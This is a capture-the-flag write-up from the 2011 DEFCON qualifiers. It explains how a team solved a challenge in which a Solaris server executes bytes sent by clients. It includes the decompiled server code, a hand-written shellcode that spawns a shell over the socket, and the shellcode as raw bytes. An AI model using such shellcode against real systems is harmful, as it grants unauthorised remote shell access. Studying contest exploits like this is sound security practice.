---
title: DEFCON quals 19 - Pwtent Pwanble 200 writup
date: 2011-06-06 23:50 UTC
tags: hacking, infosec
---

Here’s how we solved the pp200 challenge, with the Shellphish team (by Manuel, Johannes, Don and I).

For this challenge, we were given an address/port and a file, which was a Solaris executable.
Opened in IDA, the executable turned out to be a simple forking server.   For each incoming TCP connection, if the source port is in the 5000-6000 range, 73 bytes are read and then executed (except the first byte).
The child thread just executed this:


```c
int __cdecl client_callback(int fd)
{
    void *v1; // esp@1
    uint16_t v2; // ax@3
    int v4; // [sp+0h] [bp-38h]@1
    int execute_buf; // [sp+Ch] [bp-2Ch]@1
    int *v6; // [sp+10h] [bp-28h]@1
    int v7; // [sp+14h] [bp-24h]@6
    void (*execute_the_buffer)(void); // [sp+18h] [bp-20h]@1
    socklen_t len; // [sp+1Ch] [bp-1Ch]@1
    struct sockaddr addr; // [sp+20h] [bp-18h]@1

    v6 = &v4;
    v1 = alloca(16 * ((unsigned int)(BUFSIZE + 30) >> 4));
    execute_buf = 16 * ((unsigned int)((char *)&execute_buf + 3) >> 4);
    execute_the_buffer = (void (*)(void))(16 * ((unsigned int)((char *)&execute_buf + 3) >> 4) + 1);
    len = 16;
    if ( getpeername(fd, &addr, &len) == -1 )
        exit(-1);
    v2 = ntohs(*(uint16_t *)&addr.sa_data[0]);
    printf("port: %d \n\n\n", v2);
    if ( ntohs(*(uint16_t *)&addr.sa_data[0]) > 0x1387u && ntohs(*(uint16_t *)&addr.sa_data[0]) <= 0x1770u )
        exit(-1);
    v7 = readAll(fd, execute_buf, BUFSIZE);
    printf("read %d bytes\n\n\n", v7);
    execute_the_buffer();
    return 0;
}
```
So, we needed to send a shellcode shorter than 72 bytes. Unfortunately,
Metasploit was of little help here, so we had to scout the web looking for
suitable candidates. After several cases of it-work-on-our-VM-but-not-at-DDtek,
we decided to roll our own.
                                                     
Here it is: it spawns a shell using the TCP connection file descriptor as
stdin, stdout and stderr.

```c
#include <stdio.h>
#include <sys types.h>
#include <unistd.h>
#include <fcntl.h>

void f(void);
    int
main(int argc, char **argv)
{
    f();
}
void f(void) 
{
    __asm__(
            //padding
            "nop \n"
            //dup 0 into 5
            "xor %edx, %edx \n"
            "xor %ebx, %ebx \n"
            "xor %edi, %edi \n"
            "xor %ecx, %ecx \n"
            "mov $9, %bl \n"
            "mov $62, %di \n"
            "mov $5, %cl \n"
            "push %edx \n"
            "push %ebx \n"
            "push %ecx \n"
            "push %edx \n"
            "mov %edi, %eax \n"
            "int $0x91 \n"
            //dup 1 into 5
            "push $1 \n"
            "push %ebx \n"
            "push %ecx \n"
            "push %edx \n"
            "mov %edi, %eax \n"
            "int $0x91 \n"
            //dup 2 into 5
            "push $2 \n"
            "push %ebx \n"
            "push %ecx \n"
            "push %edx \n"
            "mov %edi, %eax \n"
            "int $0x91 \n"
            //   //close stdin
            //   "push %edx \n"
            //   "push %edx \n"
            //   "incl %ecx \n"
            //   "mov %ecx, %eax \n"
            //   "int $0x91 \n"
            //shell
            "xorl   %eax,%eax \n"
            "pushl  %eax \n"
            "pushl  $0x68732f6e \n"
            "pushl  $0x69622f2f \n"
            "movl   %esp,%ebx \n"
            "pushl  %eax \n"
            "pushl  %ebx \n"
            "movl   %esp,%edx \n"
            "pushl  %eax \n"
            "pushl  %edx \n"
            "pushl  %ebx \n"
            "movb   $0x3b,%al \n"
            "pushl  %eax \n"
            "int    $0x91 \n"
            );
}
```


Total: 69 bytes (and 1 for padding).

Here’s the shellcode

```
\x90\x31\xd2\x31\xdb\x31\xff\x31\xc9\xb3\x09\x66\xbf\x3e\x00\xb1\x05\x52\x53\x51\x52\x89\xf8\xcd\x91\x6a\x01\x53\x51\x52\x89\xf8\xcd\x91\x6a\x02\x53\x51\x52\x89\xf8\xcd\x91\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe2\x50\x52\x53\xb0\x3b\x50\xcd\x91
```

That’s it. For my future reference, here’s the mapping between the familiar Debian commands and the OpenSolaris ones that were useful in the competition.

* apt-cache search  => pkg search
* apt-get install => pkg install
* strace => truss (strace didn’t appear to work)


Ciao!
